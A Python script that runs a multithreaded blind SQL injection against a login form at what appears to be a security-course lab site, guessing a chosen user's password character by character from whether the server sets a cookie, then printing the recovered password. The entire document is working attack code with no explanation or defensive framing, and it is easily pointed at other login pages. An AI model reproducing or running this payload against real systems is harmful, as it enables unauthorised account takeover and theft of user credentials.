import requests as rq
from string import ascii_letters, digits, punctuation
from threading import Thread
from time import clock

alphabet = ascii_letters+digits+punctuation
l_alph = len(alphabet)
url = "http://enter.seclab.stepic.org/area51/sezam.php"
amt_threads = 10

sql_injection = "%s' and substring(password,%d,1)='%s' #"

pwd = "asd"
users = ['admin','mib1', 'mib2', 'mib3', 'mib4', 'ixxanatai', 'mib5', 'mib6', 'mib7', 'skynet', 'mib8', 'bender', 'mib9', 'alex']

login = sql_injection
password = {}
id_ = 5
def start(start,step):
  i = start
  stop = False
  while(stop == False):
    for ii in range(l_alph):
      symbol = alphabet[ii]
      res = rq.post(url, data = {"login":login%(users[id_],i,symbol),"pwd":pwd},allow_redirects=False)
      if(len(res.cookies)==1):
        password[i]=symbol
        break
      elif(ii==l_alph-1):
        stop = True
    i+=step

def start_threads(func):
  tasks = [Thread(target = func, args=(i+1,amt_threads,)) for i in range(amt_threads)]
  for i in tasks:
    i.start()
  for i in tasks:
    i.join()

print("[+] Start brute...")
start_time = clock()
start_threads(start)
end_time = clock()
print("[+] Password:")
out = ''.join([password[i] for i in range(1,len(password)+1)])
print("\t%s:%s"%(users[id_],out))
print("[+] Finished brute in %f"%(end_time))